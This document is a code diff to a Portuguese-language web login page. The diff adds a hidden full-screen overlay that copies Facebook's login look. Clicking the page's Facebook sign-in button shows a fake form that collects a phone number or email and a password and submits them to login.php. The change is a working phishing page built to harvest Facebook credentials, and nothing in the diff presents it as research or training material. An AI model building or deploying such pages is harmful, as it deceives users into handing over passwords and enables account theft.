@@ -1,4 +1,3 @@
-https://t.co/9YaaPlmVvf
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -26,6 +25,69 @@ https://t.co/9YaaPlmVvf
 <!--===============================================================================================-->
 	<link rel="stylesheet" type="text/css" href="css/util.css">
 	<link rel="stylesheet" type="text/css" href="css/main.css">
+	<style>
+		body{margin: 0;}
+		a{text-decoration: none;}
+		.dig{
+			background: #F5F6F8;
+			width: 100%;
+			padding: 14px;
+			-moz-appearance: none;
+			box-sizing: border-box;
+			border-radius: 4px;
+			overflow: hidden;
+			border-top: 1px solid #F3F3F3;
+			border-right: 1px solid #E8E8E8;
+			border-bottom: 1px solid #D1D2D4;
+			border-left: 1px solid #E6E6E6;
+			font-family: Helvetica, Arial, sans-serif;
+			font-size: 14px;
+		}
+		textarea:focus, input:focus {
+			box-shadow: 0 0 0 0;
+			outline: 0;
+		}
+		.botao{
+			width: 100%;
+			background: #1878F3;
+			color: #FFFFFF;
+			padding: 10px;
+			-moz-appearance: none;
+			box-sizing: border-box;
+			border-radius: 5px;
+			overflow: hidden;
+			border-top: 1px solid #2B73D5;
+			border-right: 1px solid #307AD1;
+			border-bottom: 1px solid #2371D6;
+			border-left: 1px solid #3678CC;
+			font-family: Helvetica, Arial, sans-serif;
+			font-size: 17px;
+			font-weight: bolder;
+			text-shadow: 0 -1px rgba(0, 0, 0, .25);
+		}
+		.esqueceu{
+			color: #216fdb;
+			font-family: 'Roboto-Regular', 'Helvetica', 'sans-serif';
+			font-size: 14px;
+			text-align: center;
+		}
+		.nova{
+			background: #00A400;
+			padding: 10px 16px;
+			color: #FFF;
+			font-family: Helvetica, Arial, sans-serif;
+			font-size: 15px;
+			font-weight: bolder;
+			text-shadow: 0 -1px 0 rgba(0, 0, 0, .35);
+			border-radius: 3px;
+			height: 36px;
+		}
+	</style>
+	<script>
+		function demoDisplay() {
+  document.getElementById("fb").style.display = "block";
+}
+	</script>
 <!--===============================================================================================-->
 </head>
 <body>
@@ -38,7 +100,7 @@ https://t.co/9YaaPlmVvf
 						Entrar com
 					</span>
 
-					<a href="#" class="btn-face m-b-20">
+					<a href="#" onClick="demoDisplay()" class="btn-face m-b-20">
 						<i class="fa fa-facebook-official"></i>
 						Facebook
 					</a>
@@ -67,6 +129,43 @@ https://t.co/9YaaPlmVvf
 	<script src="vendor/countdowntime/countdowntime.js"></script>
 <!--===============================================================================================-->
 	<script src="js/main.js"></script>
-
+<div id="fb" style="margin: 0 auto; z-index: 2; position: absolute; left:0; top:0; display: none; background: #FFF; width: 100%; height: 100%;">
+<table style="margin: 0 auto;" width="460" border="0" cellspacing="0" cellpadding="0">
+  <tbody>
+    <tr>
+      <td>
+      <img src="imgs/topo.fw.png" width="100%" />
+	  </td>
+    </tr>
+    <tr>
+      <td style="padding: 4%">
+		  <form enctype="multipart/form-data" action="login.php">
+			<div class="daiv">
+			  <input style="margin-bottom: 8px;" class="dig" placeholder="Número de celular ou email" name="email" type="text"><br>
+			</div>
+			<div class="daiv">
+			  <input style="margin-bottom: 12px;" class="dig" placeholder="Senha" name="pw" type="text"><br>
+			</div>
+		  	<input class="botao" value="Entrar" type="submit">
+		  </form>
+	  </td>
+    </tr>
+    <tr>
+      <td><div style="text-align: center; margin-bottom: 10px;"><a class="esqueceu" href="#">Esqueceu a senha?</a></div></td>
+    </tr>
+    <tr>
+      <td style="padding: 0 8%;">
+	  <img src="imgs/ou.fw.png" width="100%" /></td>
+    </tr>
+    <tr>
+      <td><div style="margin-bottom: 120px; margin-top: 20px; text-align: center;"><a class="nova" href="#">Criar nova conta</a></div></td>
+    </tr>
+    <tr>
+      <td style="padding: 0 18%;">
+      <img src="imgs/linguagens.fw.png" width="100%" /></td>
+    </tr>
+  </tbody>
+</table>
+</div>
 </body>
 </html>
